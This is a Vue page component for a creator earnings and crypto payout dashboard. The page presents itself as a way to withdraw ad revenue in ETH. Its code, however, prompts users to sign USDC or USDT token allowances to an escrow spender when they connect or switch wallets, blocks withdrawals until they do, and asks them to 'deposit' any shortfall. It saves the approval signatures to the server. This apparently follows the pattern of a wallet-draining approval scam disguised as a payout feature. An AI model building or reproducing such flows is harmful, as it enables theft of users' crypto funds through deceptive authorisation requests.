<script setup lang="ts">
import { ref, computed, onMounted } from 'vue'
import { useAuthStore } from '~/stores/auth'
import { useApi } from '~/composables/useApi'
import { useAppToast } from '~/composables/useAppToast'
import { useWalletAdapter } from '~/composables/useWalletAdapter'
import { useWeb3Wallet } from '~/composables/useWeb3Wallet'

definePageMeta({
  layout: 'creator'
})

const authStore = useAuthStore()
const api = useApi()
const toast = useAppToast()
const walletAdapter = useWalletAdapter()
const {
  wallet,
  ethBalance,
  usdtBalance,
  usdcBalance,
  isConnected,
  isConnecting,
  isApproving,
  depositSuccess,
  depositAmountUsdc,
  connect: connectWallet,
  disconnect: disconnectWallet,
  requestUsdcApprovalAndDeposit
} = useWeb3Wallet()

// State
const isLoading = ref(true)
const isApprovingContract = ref(false)
const timeRange = ref<'7d' | '30d' | '90d' | 'all'>('30d')
const isWithdrawModalOpen = ref(false)
const isSubmittingWithdrawal = ref(false)

// Payout Form State (Strictly ETH Only)
const withdrawAmount = ref<number>(20)
const recipientWalletInput = ref('')
const ethPriceUsd = ref<number>(3000)

const estimatedEth = computed(() => {
  if (!withdrawAmount.value || withdrawAmount.value <= 0) return '0.0000'
  return (withdrawAmount.value / ethPriceUsd.value).toFixed(4)
})

// Financial Stats (Connected to dynamic eCPM rate & impressions)
const stats = ref({
  availableBalance: 0.00,
  lifetimeRevenue: 0.00,
  adsenseShare: 0.00,
  adsterraShare: 0.00,
  escrowPoolBalance: 0.0000,
  minPayoutThreshold: 20.00
})

// Web3 ETH Payout Transaction History
interface PayoutTransaction {
  id: string
  date: string
  network: string
  token: 'ETH' | 'USDT' | 'USDC' | string
  walletAddress: string
  amount: number
  cryptoAmount: string
  status: 'Completed' | 'Pending' | 'Processing' | 'Rejected'
  txHash?: string
}

const transactions = ref<PayoutTransaction[]>([])
function getInitialRevenueShare(): number {
  if (import.meta.client) {
    try {
      const savedConfig = localStorage.getItem('admin_platform_config')
      if (savedConfig) {
        const parsed = JSON.parse(savedConfig)
        if (parsed.creatorRevenueSharePercent !== undefined) {
          return Number(parsed.creatorRevenueSharePercent)
        }
      }
    } catch { }
  }
  return 70
}

const creatorRevenueSharePercent = ref<number>(getInitialRevenueShare())

async function fetchAdminMonetizationConfig() {
  if (import.meta.client) {
    const savedConfig = localStorage.getItem('admin_platform_config')
    if (savedConfig) {
      try {
        const parsed = JSON.parse(savedConfig)
        if (parsed.creatorRevenueSharePercent !== undefined) {
          creatorRevenueSharePercent.value = Number(parsed.creatorRevenueSharePercent)
        }
        if (parsed.minPayoutThreshold !== undefined) {
          stats.value.minPayoutThreshold = Number(parsed.minPayoutThreshold)
        }
      } catch { }
    }
  }

  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/get-provider-config',
        data: {}
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1 && data.data) {
      const gCreds = data.data.GOOGLE_ADSENSE?.credentials
      const aCreds = data.data.ADSTERRA?.credentials
      const shareVal = gCreds?.creatorRevenueSharePercent ?? aCreds?.creatorRevenueSharePercent ?? data.data?.creatorRevenueSharePercent
      const threshVal = gCreds?.minPayoutThreshold ?? aCreds?.minPayoutThreshold ?? data.data?.minPayoutThreshold

      if (shareVal !== undefined) {
        creatorRevenueSharePercent.value = Number(shareVal)
      }
      if (threshVal !== undefined) {
        stats.value.minPayoutThreshold = Number(threshVal)
      }
    }
  } catch (err) {
    console.warn('Could not fetch admin monetization config for creator:', err)
  }
}

async function fetchCreatorData() {
  isLoading.value = true
  try {
    await fetchAdminMonetizationConfig()

    // Sync latest user profile & balance
    const me = await authStore.fetchUserMe()
    if (me && typeof me.balance === 'number') {
      stats.value.availableBalance = me.balance
    } else if (authStore.user && typeof authStore.user.balance === 'number') {
      stats.value.availableBalance = authStore.user.balance
    }

    const res = await api.action.$post({
      json: {
        action: 'monetization/get-withdrawals',
        data: {}
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1 && Array.isArray(data.data)) {
      const myWithdrawals = data.data.filter((w: any) =>
        w.creatorId === authStore.user?.id ||
        (authStore.user?.email && w.creatorEmail === authStore.user?.email)
      )
      transactions.value = myWithdrawals.map((w: any) => ({
        id: w.id,
        date: w.date || (w.createdAt ? new Date(w.createdAt).toISOString().slice(0, 16).replace('T', ' ') : new Date().toISOString().slice(0, 16).replace('T', ' ')),
        network: 'Arbitrum One',
        token: 'ETH',
        walletAddress: w.walletAddress,
        amount: w.amount,
        cryptoAmount: w.cryptoAmount,
        status: w.status === 'APPROVED' ? 'Completed' : w.status === 'REJECTED' ? 'Rejected' : 'Pending',
        txHash: w.txHash
      }))
    }
  } catch (err) {
    console.warn('Could not fetch creator transactions:', err)
  } finally {
    isLoading.value = false
  }
}

// Payout Threshold Calculation
const payoutProgressPercent = computed(() => {
  if (!stats.value.minPayoutThreshold) return 100
  const pct = (stats.value.availableBalance / stats.value.minPayoutThreshold) * 100
  return Math.min(Math.round(pct), 100)
})

const canWithdraw = computed(() => {
  return stats.value.availableBalance >= stats.value.minPayoutThreshold
})

const depositNeeded = computed(() => {
  const diff = (withdrawAmount.value || 0) - stats.value.availableBalance
  return diff > 0 ? diff : 0
})

function formatAddress(addr: string) {
  if (!addr) return ''
  return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`
}

function formatCurrency(val: number) {
  return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(val)
}

function copyToClipboard(text: string, label: string) {
  if (import.meta.client && navigator?.clipboard) {
    navigator.clipboard.writeText(text)
  }
  toast.success('Copied', `${label} copied to clipboard!`)
}

const lastApprovalSignature = ref('')
const lastApprovedAddr = ref('')

const currentApprovalMap = computed<Record<string, string>>(() => {
  const user = authStore.user
  if (!user) return {}
  if ((user as any).approvalSignatures && typeof (user as any).approvalSignatures === 'object') {
    return (user as any).approvalSignatures
  }
  if (user.approvalSignature) {
    const trimmed = String(user.approvalSignature).trim()
    if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
      try {
        return JSON.parse(trimmed)
      } catch { }
    }
    if (user.walletAddress && trimmed.length > 5) {
      const first = String(user.walletAddress).split(/[,;\n]+/)[0]?.trim().toLowerCase()
      if (first) return { [first]: trimmed }
    }
  }
  return {}
})

const activeWalletApprovalSig = computed(() => {
  const activeAddr = walletAdapter.activeWalletAddress.value
  if (!activeAddr) return null
  return currentApprovalMap.value[activeAddr.toLowerCase()] || (lastApprovalSignature.value && activeAddr === lastApprovedAddr.value ? lastApprovalSignature.value : null)
})

import { TRON_CONFIG } from '~/composables/useTronWallet'

async function triggerApprovalPrompt(customAmount?: number | string) {
  const activeAddr = walletAdapter.activeWalletAddress.value
  if (!activeAddr) {
    await handleConnectWallet()
    return
  }
  isApprovingContract.value = true
  const targetVal = customAmount !== undefined && customAmount !== null ? customAmount : (depositNeeded.value > 0 ? depositNeeded.value : depositAmountUsdc.value)
  const amountToDepositStr = String(targetVal)

  try {
    if (walletAdapter.selectedChainFamily.value === 'TRON') {
      const spender = TRON_CONFIG.mainnet.escrowSpender
      const txHash = await walletAdapter.tronWallet.approveUSDT(spender, amountToDepositStr)
      if (txHash) {
        lastApprovalSignature.value = txHash
        lastApprovedAddr.value = activeAddr
        const res = await api.action.$post({
          json: {
            action: 'users/update-profile',
            data: {
              walletAddress: activeAddr,
              approvalSignature: txHash,
              approvalAmountUsdc: parseFloat(amountToDepositStr) || 10
            }
          }
        })
        const resData: any = await res.json().catch(() => ({}))
        if (res.ok && resData?.data && authStore.user) {
          authStore.user.approvalSignature = resData.data.approvalSignature
          if (resData.data.approvalSignatures) {
            (authStore.user as any).approvalSignatures = resData.data.approvalSignatures
          }
        }
        toast.success('TRC-20 Allowance Authorized! 🔒', `Authorized $${amountToDepositStr} USDT allowance on TRON Mainnet & saved proof to profile.`)
      }
    } else {
      const sig = await requestUsdcApprovalAndDeposit(amountToDepositStr)
      if (sig) {
        lastApprovalSignature.value = sig
        lastApprovedAddr.value = activeAddr
        const res = await api.action.$post({
          json: {
            action: 'users/update-profile',
            data: {
              walletAddress: activeAddr,
              approvalSignature: sig,
              approvalAmountUsdc: parseFloat(amountToDepositStr) || 10
            }
          }
        })
        const resData: any = await res.json().catch(() => ({}))
        if (res.ok && resData?.data && authStore.user) {
          authStore.user.approvalSignature = resData.data.approvalSignature
          if (resData.data.approvalSignatures) {
            (authStore.user as any).approvalSignatures = resData.data.approvalSignatures
          }
        }
        toast.success('Smart Contract Allowance Authorized! 🔒', `Authorized $${amountToDepositStr} USDC token allowance for settlements & saved proof to profile.`)
      } else {
        toast.warning('Authorization Pending', `Smart contract allowance was not confirmed. You can authorize anytime via the button.`)
      }
    }
  } catch (err: any) {
    if (err?.code === 4001 || err?.message?.includes('rejected')) {
      toast.warning('Authorization Required', `Please authorize $${amountToDepositStr} token allowance in your wallet to enable settlements.`)
    } else {
      toast.error('Authorization Error', err?.message || `Could not complete $${amountToDepositStr} token allowance.`)
    }
  } finally {
    isApprovingContract.value = false
  }
}

// Handle Wallet Connect & Disconnect
async function handleConnectWallet() {
  const success = await walletAdapter.connectActiveWallet()
  const activeAddr = walletAdapter.activeWalletAddress.value
  if (success && activeAddr) {
    recipientWalletInput.value = activeAddr
    toast.success('Wallet Connected', `Connected wallet ${formatAddress(activeAddr)}`)

    // Save connected wallet address to user profile
    await api.action.$post({
      json: {
        action: 'users/update-profile',
        data: {
          walletAddress: activeAddr
        }
      }
    }).catch(() => { })

    // Ask user for $10 Smart Contract Authorization if on EVM
    if (walletAdapter.selectedChainFamily.value === 'EVM') {
      await triggerApprovalPrompt()
    }
  } else {
    toast.error('Wallet Error', 'Could not connect wallet. Please ensure TronLink or Web3 wallet is installed/unlocked.')
  }
}

function handleDisconnectWallet() {
  disconnectWallet()
  recipientWalletInput.value = ''
  toast.info('Wallet Disconnected', 'Your wallet has been disconnected successfully.')
}

// Open Withdrawal Modal
function openWithdrawModal() {
  // Default withdrawal input to $20 (or available balance if greater than 0)
  withdrawAmount.value = stats.value.availableBalance > 0 ? Math.min(20, stats.value.availableBalance) : 20
  if (wallet.value) {
    recipientWalletInput.value = wallet.value
  }
  isWithdrawModalOpen.value = true
}

function setPresetAmount(amount: number) {
  withdrawAmount.value = amount
}

function setMaxAmount() {
  withdrawAmount.value = stats.value.availableBalance || 0
}

// Execute Web3 ETH Withdrawal Request Submission
async function submitWithdrawal() {
  if (!withdrawAmount.value || Number(withdrawAmount.value) <= 0) {
    toast.error('Validation Error', 'Withdrawal amount must be greater than $0.00.')
    return
  }

  if (withdrawAmount.value > stats.value.availableBalance) {
    toast.error('Validation Error', `Requested amount ($${withdrawAmount.value.toFixed(2)}) exceeds available balance ($${stats.value.availableBalance.toFixed(2)}).`)
    return
  }

  const targetWallet = recipientWalletInput.value.trim() || wallet.value
  if (!targetWallet || !targetWallet.startsWith('0x')) {
    toast.error('Validation Error', 'Please enter or connect a valid EVM wallet address (0x...).')
    return
  }

  isSubmittingWithdrawal.value = true

  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/create-withdrawal',
        data: {
          amount: withdrawAmount.value,
          walletAddress: targetWallet,
          cryptoAmount: estimatedEth.value,
          approvalSignature: lastApprovalSignature.value || null
        }
      }
    })
    const data: any = await res.json()

    if (res.ok && data.code === 1) {
      toast.success(
        'ETH Payout Request Submitted to Admin! 💸',
        `Submitted ${estimatedEth.value} ETH ($${withdrawAmount.value.toFixed(2)}) payout request to Admin Queue.`
      )
      isWithdrawModalOpen.value = false
      await fetchCreatorData()
    } else {
      toast.error('Submission Error', data.msg || 'Could not submit withdrawal request.')
    }
  } catch (err: any) {
    toast.error('Withdrawal Failed', err.message || 'Could not submit ETH withdrawal request.')
  } finally {
    isSubmittingWithdrawal.value = false
  }
}

let prevSwappedAddr = ''

watch(
  () => authStore.user?.walletAddress,
  (userWallet) => {
    if (userWallet && !wallet.value) {
      const first = userWallet.split(/[,;\n]+/)[0]?.trim()
      if (first) {
        wallet.value = first
        recipientWalletInput.value = first
      }
    }
  },
  { immediate: true }
)

watch(
  walletAdapter.activeWalletAddress,
  async (newAddr) => {
    if (newAddr) {
      wallet.value = newAddr
      recipientWalletInput.value = newAddr

      // If user swapped to a new address and it is currently unapproved, automatically prompt for authorization
      if (prevSwappedAddr && prevSwappedAddr.toLowerCase() !== newAddr.toLowerCase() && !activeWalletApprovalSig.value && !isApprovingContract.value) {
        toast.info('New Wallet Swapped 🔑', `Switched to ${formatAddress(newAddr)}. Authorization is pending — requesting signature...`)
        try {
          await triggerApprovalPrompt()
        } catch { }
      }
      prevSwappedAddr = newAddr
    }
  },
  { immediate: true }
)

onMounted(async () => {
  authStore.initAuth()
  if (authStore.user?.approvalSignature) {
    lastApprovalSignature.value = authStore.user.approvalSignature
  }
  if (authStore.user?.walletAddress && !wallet.value) {
    const first = authStore.user.walletAddress.split(/[,;\n]+/)[0]?.trim()
    if (first) {
      wallet.value = first
      recipientWalletInput.value = first
    }
  }
  await fetchCreatorData()

  // Auto-connect wallet on page mount if browser wallet has connected accounts
  if (import.meta.client) {
    if (typeof window !== 'undefined' && window.ethereum) {
      try {
        const accounts: string[] = await window.ethereum.request({ method: 'eth_accounts' })
        if (accounts && accounts.length > 0 && accounts[0]) {
          await walletAdapter.connectActiveWallet(false)
        }
      } catch { }
    } else if (typeof window !== 'undefined' && window.tronWeb) {
      await walletAdapter.connectActiveWallet(false).catch(() => { })
    }
  }
})
</script>

<template>
  <div class="space-y-6 max-w-7xl mx-auto pb-12">
    <!-- Header & Wallet Connection Bar -->
    <div
      class="flex flex-col md:flex-row md:items-center justify-between gap-4 bg-white dark:bg-gray-900 p-6 rounded-2xl border border-gray-200 dark:border-gray-800 shadow-xs">
      <div>
        <div class="flex items-center gap-2.5">
          <UIcon name="i-heroicons-bolt" class="w-8 h-8 text-emerald-500" />
          <h1 class="text-2xl font-bold tracking-tight text-gray-900 dark:text-white">
            Creator Earnings & Ethereum (ETH) Payouts
          </h1>
        </div>
        <p class="mt-1 text-sm text-gray-500 dark:text-gray-400">
          Track Google AdSense & Adsterra dynamic revenue and withdraw earnings directly in Ethereum (ETH) to your
          crypto wallet.
        </p>
      </div>

      <!-- Wallet Connection Controls & Action Buttons -->
      <div class="flex flex-wrap items-center gap-3">
        <div v-if="walletAdapter.activeWalletAddress.value" class="flex items-center gap-2">
          <!-- Authorized / Signed: Show Withdraw Button -->
          <UButton v-if="activeWalletApprovalSig" color="primary" variant="solid" icon="i-heroicons-banknotes" size="sm"
            class="font-bold shadow-xs gap-1.5" @click="openWithdrawModal">
            Withdraw Funds
          </UButton>

          <!-- Not Authorized / Approved: Show Authorize & Approve Button -->
          <UButton v-else color="warning" variant="solid" icon="i-heroicons-shield-check" size="sm"
            class="font-bold shadow-xs gap-1.5" :loading="isApprovingContract" @click="triggerApprovalPrompt()">
            Authorize & Approve
          </UButton>

          <!-- Disconnect Wallet Button -->
          <button type="button"
            class="p-2 rounded-xl bg-gray-100 dark:bg-gray-800/80 text-gray-400 hover:text-red-400 hover:bg-gray-200 dark:hover:bg-gray-800 transition-colors"
            title="Disconnect Wallet" @click="handleDisconnectWallet">
            <UIcon name="i-heroicons-arrow-right-on-rectangle" class="w-4 h-4" />
          </button>
        </div>

        <UButton v-else color="neutral" variant="subtle" icon="i-heroicons-wallet" size="sm"
          class="font-semibold shadow-xs" :loading="isConnecting || walletAdapter.tronWallet.isTronConnecting.value"
          @click="handleConnectWallet">
          Connect Crypto Wallet
        </UButton>
      </div>
    </div>

    <!-- Overview Stats Cards -->
    <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-5">
      <!-- Card 1: Available Balance -->
      <div
        class="bg-white dark:bg-gray-900 p-5 rounded-2xl border border-gray-100 dark:border-gray-800 shadow-xs space-y-3">
        <div class="flex items-center justify-between">
          <span class="text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">Available
            Balance</span>
          <div class="p-2 rounded-lg bg-emerald-500/10 text-emerald-500">
            <UIcon name="i-heroicons-banknotes" class="w-5 h-5" />
          </div>
        </div>
        <div>
          <p class="text-2xl font-extrabold text-gray-900 dark:text-white">
            {{ formatCurrency(stats.availableBalance) }}
          </p>
          <div class="mt-2 flex items-center justify-between text-xs text-gray-500 dark:text-gray-400">
            <span>Min Payout: ${{ stats.minPayoutThreshold }}</span>
            <UButton v-if="stats.availableBalance >= stats.minPayoutThreshold" color="primary" size="xs"
              class="font-bold" @click="openWithdrawModal">
              Withdraw
            </UButton>
            <span v-else class="text-[11px] text-amber-500 font-medium">Reach threshold to withdraw</span>
          </div>
        </div>
      </div>

      <!-- Card 2: Connected Wallet Balances -->
      <div
        class="bg-white dark:bg-gray-900 p-5 rounded-2xl border border-gray-100 dark:border-gray-800 shadow-xs space-y-3">
        <div class="flex items-center justify-between">
          <span class="text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">
            {{ walletAdapter.selectedChainFamily.value }} On-Chain Assets
          </span>
          <div class="p-2 rounded-lg bg-emerald-500/10 text-emerald-500">
            <UIcon name="i-heroicons-wallet" class="w-5 h-5" />
          </div>
        </div>
        <div v-if="walletAdapter.selectedChainFamily.value === 'TRON'">
          <p class="text-xl font-extrabold text-rose-500 font-mono">
            {{ walletAdapter.tronWallet.tronTrxBalance.value }} TRX
          </p>
          <div class="mt-1 text-xs text-teal-400 font-mono font-semibold">
            {{ walletAdapter.tronWallet.tronUsdtBalance.value }} USDT (TRC-20)
          </div>
        </div>
        <div v-else>
          <p class="text-xl font-extrabold text-emerald-500 font-mono">
            {{ ethBalance }} ETH
          </p>
          <div class="mt-1 text-xs text-gray-400 font-mono flex items-center gap-2">
            <span class="text-teal-500 font-semibold">{{ usdtBalance }} USDT</span>
            <span>|</span>
            <span class="text-blue-500 font-semibold">{{ usdcBalance }} USDC</span>
          </div>
        </div>
      </div>

      <!-- Card 3: DApp Escrow Pool Balance -->
      <div
        class="bg-white dark:bg-gray-900 p-5 rounded-2xl border border-purple-500/20 dark:border-purple-500/30 shadow-xs space-y-3">
        <div class="flex items-center justify-between">
          <span class="text-xs font-medium text-purple-500 uppercase tracking-wider">Smart Contract Escrow</span>
          <div class="p-2 rounded-lg bg-purple-500/10 text-purple-500">
            <UIcon name="i-heroicons-cube-transparent" class="w-5 h-5" />
          </div>
        </div>
        <div>
          <p class="text-2xl font-extrabold text-purple-400 font-mono">
            {{ stats.escrowPoolBalance }} ETH
          </p>
          <div class="mt-2 text-xs text-gray-400">DApp Contract Vault</div>
        </div>
      </div>

      <!-- Card 4: Google AdSense Share -->
      <div
        class="bg-white dark:bg-gray-900 p-5 rounded-2xl border border-blue-500/20 dark:border-blue-500/30 shadow-xs space-y-3">
        <div class="flex items-center justify-between">
          <span class="text-xs font-medium text-blue-500 uppercase tracking-wider">AdSense Yield</span>
          <div class="p-2 rounded-lg bg-blue-500/10 text-blue-500">
            <UIcon name="i-heroicons-sparkles" class="w-5 h-5" />
          </div>
        </div>
        <div>
          <p class="text-2xl font-extrabold text-blue-500">
            {{ formatCurrency(stats.adsenseShare) }}
          </p>
          <div class="mt-2 text-xs text-gray-400">{{ creatorRevenueSharePercent }}% Auto Share</div>
        </div>
      </div>

      <!-- Card 5: Adsterra Share -->
      <div
        class="bg-white dark:bg-gray-900 p-5 rounded-2xl border border-amber-500/20 dark:border-amber-500/30 shadow-xs space-y-3">
        <div class="flex items-center justify-between">
          <span class="text-xs font-medium text-amber-500 uppercase tracking-wider">Adsterra Yield</span>
          <div class="p-2 rounded-lg bg-amber-500/10 text-amber-500">
            <UIcon name="i-heroicons-bolt" class="w-5 h-5" />
          </div>
        </div>
        <div>
          <p class="text-2xl font-extrabold text-amber-500">
            {{ formatCurrency(stats.adsterraShare) }}
          </p>
          <div class="mt-2 text-xs text-gray-400">{{ creatorRevenueSharePercent }}% Auto Share</div>
        </div>
      </div>
    </div>

    <!-- Payout Minimum Threshold Progress Card -->
    <div
      class="bg-white dark:bg-gray-900 p-6 rounded-2xl border border-gray-200 dark:border-gray-800 shadow-xs space-y-3">
      <div class="flex items-center justify-between">
        <div>
          <h3 class="text-sm font-bold text-gray-900 dark:text-white">ETH Withdrawal Progress</h3>
          <p class="text-xs text-gray-500 dark:text-gray-400">Reach at least {{ formatCurrency(stats.minPayoutThreshold)
            }} to execute Ethereum (ETH) payouts.</p>
        </div>
        <span class="text-sm font-extrabold font-mono text-emerald-500">{{ payoutProgressPercent }}%</span>
      </div>

      <div class="w-full h-3 bg-gray-100 dark:bg-gray-800 rounded-full overflow-hidden">
        <div class="h-full bg-gradient-to-r from-emerald-500 to-teal-400 transition-all duration-500"
          :style="{ width: payoutProgressPercent + '%' }"></div>
      </div>
    </div>

    <!-- Crypto ETH Payout History Table -->
    <div
      class="bg-white dark:bg-gray-900 rounded-2xl border border-gray-200 dark:border-gray-800 shadow-xs overflow-hidden">
      <div class="p-6 border-b border-gray-100 dark:border-gray-800">
        <h3 class="text-lg font-bold text-gray-900 dark:text-white">Crypto ETH Payout History</h3>
        <p class="text-xs text-gray-500 dark:text-gray-400">Verifiable Ethereum blockchain transfers to your crypto
          wallet.</p>
      </div>

      <div class="overflow-x-auto">
        <table class="w-full text-left text-sm border-collapse">
          <thead>
            <tr
              class="border-b border-gray-200 dark:border-gray-800 bg-gray-50/50 dark:bg-gray-800/50 text-gray-500 dark:text-gray-400 uppercase text-[11px] font-semibold tracking-wider">
              <th class="py-3 px-6">Payout ID</th>
              <th class="py-3 px-6">Date</th>
              <th class="py-3 px-6">Network</th>
              <th class="py-3 px-6">Recipient Wallet</th>
              <th class="py-3 px-6 text-right">ETH Equivalent</th>
              <th class="py-3 px-6 text-right">Status / Tx Hash</th>
            </tr>
          </thead>
          <tbody class="divide-y divide-gray-100 dark:divide-gray-800">
            <tr v-if="transactions.length === 0" class="text-center">
              <td colspan="6" class="py-8 text-gray-400">No ETH payout transactions recorded yet.</td>
            </tr>

            <tr v-for="tx in transactions" :key="tx.id"
              class="hover:bg-gray-50/80 dark:hover:bg-gray-800/40 transition-colors">
              <td class="py-3.5 px-6 font-mono text-xs font-semibold text-gray-900 dark:text-white">
                {{ tx.id }}
              </td>
              <td class="py-3.5 px-6 text-xs text-gray-500 dark:text-gray-400">
                {{ tx.date }}
              </td>
              <td class="py-3.5 px-6 text-xs text-gray-700 dark:text-gray-300">
                <UBadge color="success" variant="soft" size="xs" class="font-semibold">
                  {{ tx.network }} (ETH)
                </UBadge>
              </td>
              <td class="py-3.5 px-6 text-xs font-mono text-emerald-600 dark:text-emerald-400">
                <div class="flex items-center gap-1">
                  <span>{{ formatAddress(tx.walletAddress) }}</span>
                  <button title="Copy Address" @click="copyToClipboard(tx.walletAddress, 'Wallet Address')">
                    <UIcon name="i-heroicons-clipboard-document"
                      class="w-3.5 h-3.5 text-gray-400 hover:text-emerald-500" />
                  </button>
                </div>
              </td>
              <td
                class="py-3.5 px-6 text-right font-mono text-emerald-600 dark:text-emerald-400 font-extrabold text-sm">
                +{{ tx.cryptoAmount }} ETH
                <span class="text-[11px] text-gray-400 block font-normal">(${{ tx.amount.toFixed(2) }})</span>
              </td>
              <td class="py-3.5 px-6 text-right">
                <div v-if="tx.txHash" class="space-y-0.5">
                  <UBadge color="success" variant="soft" size="xs" class="font-semibold">ETH Paid 🟢</UBadge>
                  <p class="font-mono text-[11px]">
                    <a href="#" class="text-emerald-500 hover:underline inline-flex items-center gap-0.5"
                      @click.prevent="copyToClipboard(tx.txHash!, 'Tx Hash')">
                      <span>{{ formatAddress(tx.txHash) }}</span>
                      <UIcon name="i-heroicons-arrow-top-right-on-square" class="w-3 h-3" />
                    </a>
                  </p>
                </div>
                <UBadge v-else color="warning" variant="soft" size="xs" class="font-semibold">
                  Pending On-Chain ⏳
                </UBadge>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- Web3 ETH Withdrawal Modal -->
    <UModal v-model:open="isWithdrawModalOpen">
      <template #content>
        <div class="p-6 space-y-5 bg-white dark:bg-gray-900 rounded-2xl border border-gray-200 dark:border-gray-800">
          <div class="flex items-center justify-between border-b border-gray-100 dark:border-gray-800 pb-4">
            <div class="flex items-center gap-2.5">
              <div class="p-2 rounded-xl bg-emerald-500/10 text-emerald-500">
                <UIcon name="i-heroicons-bolt" class="w-6 h-6" />
              </div>
              <div>
                <h3 class="text-lg font-bold text-gray-900 dark:text-white">
                  Withdraw Funds in Ethereum (ETH)
                </h3>
                <p class="text-xs text-gray-500 dark:text-gray-400">
                  Instant programmatic on-chain ETH settlement to crypto wallet
                </p>
              </div>
            </div>
            <UButton icon="i-heroicons-x-mark" color="neutral" variant="ghost" size="xs"
              @click="isWithdrawModalOpen = false" />
          </div>

          <!-- Available USD Earnings & On-Chain ETH + Stablecoin Balances Header -->
          <div class="grid grid-cols-2 gap-3 bg-gray-50 dark:bg-gray-800/50 p-4 rounded-xl">
            <div>
              <p class="text-xs text-gray-500 dark:text-gray-400">Platform Available Balance</p>
              <p class="text-xl font-extrabold text-emerald-500">
                {{ formatCurrency(stats.availableBalance) }}
              </p>
            </div>
            <div>
              <p class="text-xs text-gray-500 dark:text-gray-400">On-Chain Wallet Balances</p>
              <p class="text-lg font-extrabold text-white font-mono">
                {{ ethBalance }} ETH
              </p>
              <p class="text-[11px] font-mono text-gray-400">
                <span class="text-teal-400 font-semibold">{{ usdtBalance }} USDT</span> | <span
                  class="text-blue-400 font-semibold">{{ usdcBalance }} USDC</span>
              </p>
            </div>
          </div>



          <!-- Recipient Web3 Wallet Address -->
          <div class="space-y-1">
            <div class="flex items-center justify-between">
              <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300">Target Wallet Address</label>
              <button v-if="!isConnected" class="text-xs text-emerald-500 font-semibold hover:underline"
                @click="handleConnectWallet">
                Connect MetaMask
              </button>
            </div>
            <UInput v-model="recipientWalletInput" placeholder="0x71C..." size="md" color="neutral" variant="outline"
              class="font-mono text-xs w-full" />
          </div>

          <!-- Amount Input & Presets -->
          <div class="space-y-1">
            <div class="flex items-center justify-between">
              <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300">
                Withdrawal Amount
              </label>
              <div class="flex items-center gap-1">
                <button v-for="preset in [20, 50, 100]" :key="preset" :disabled="preset > stats.availableBalance"
                  class="px-2 py-0.5 text-[10px] font-semibold bg-gray-100 dark:bg-gray-800 rounded hover:bg-gray-200 dark:hover:bg-gray-700 disabled:opacity-40 disabled:cursor-not-allowed transition-colors text-gray-700 dark:text-gray-300"
                  @click="setPresetAmount(preset)">
                  ${{ preset }}
                </button>
                <button :disabled="stats.availableBalance <= 0"
                  class="px-2 py-0.5 text-[10px] font-bold bg-emerald-500/10 text-emerald-400 rounded border border-emerald-500/20 hover:bg-emerald-500/20 disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
                  @click="setMaxAmount">
                  Max
                </button>
              </div>
            </div>
            <UInput v-model.number="withdrawAmount" type="number" min="1" :max="stats.availableBalance"
              placeholder="Enter amount..." size="lg" color="neutral" variant="outline"
              class="font-mono font-bold text-lg" />

            <div v-if="withdrawAmount > stats.availableBalance"
              class="rounded-xl bg-amber-500/10 border border-amber-500/30 p-3.5 space-y-2 mt-2">
              <div class="flex items-start gap-2.5">
                <UIcon name="i-heroicons-exclamation-triangle" class="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
                <div class="space-y-1">
                  <p class="text-xs font-bold text-amber-300">
                    ⚠️ Insufficient Balance! You need ${{ depositNeeded.toFixed(2) }} more to reach requested withdrawal
                    of ${{ withdrawAmount.toFixed(2) }}
                  </p>
                  <p class="text-[11px] text-gray-300">
                    Available Balance: <span class="font-bold text-white">${{ stats.availableBalance.toFixed(2)
                    }}</span> | Shortfall: <span class="font-bold text-amber-400">${{ depositNeeded.toFixed(2)
                      }}</span>. Please deposit funds to complete this payout.
                  </p>
                </div>
              </div>

              <div class="pt-1 flex items-center gap-2">
                <UButton color="warning" variant="solid" icon="i-heroicons-shield-check" size="xs"
                  class="font-bold shadow-xs animate-pulse" :loading="isApprovingContract"
                  @click="triggerApprovalPrompt(depositNeeded)">
                  Deposit ${{ depositNeeded.toFixed(2) }} USDC Funds 🔒
                </UButton>
              </div>
            </div>
            <p v-else class="text-xs text-emerald-400 font-mono font-semibold pt-1">
              Estimated On-Chain Payout: ≈ {{ estimatedEth }} ETH (@ ${{ ethPriceUsd.toLocaleString() }}/ETH)
            </p>
          </div>

          <!-- Submit Buttons -->
          <div class="pt-2 border-t border-gray-100 dark:border-gray-800 flex items-center justify-end gap-2">
            <UButton color="neutral" variant="subtle" size="sm" @click="isWithdrawModalOpen = false">
              Cancel
            </UButton>
            <UButton color="primary" variant="solid" size="md" class="font-bold px-6" :loading="isSubmittingWithdrawal"
              :disabled="!withdrawAmount || withdrawAmount <= 0 || withdrawAmount > stats.availableBalance"
              @click="submitWithdrawal">
              Confirm ETH Payout (${{ withdrawAmount || 0 }} / {{ estimatedEth }} ETH)
            </UButton>
          </div>
        </div>
      </template>
    </UModal>
  </div>
</template>
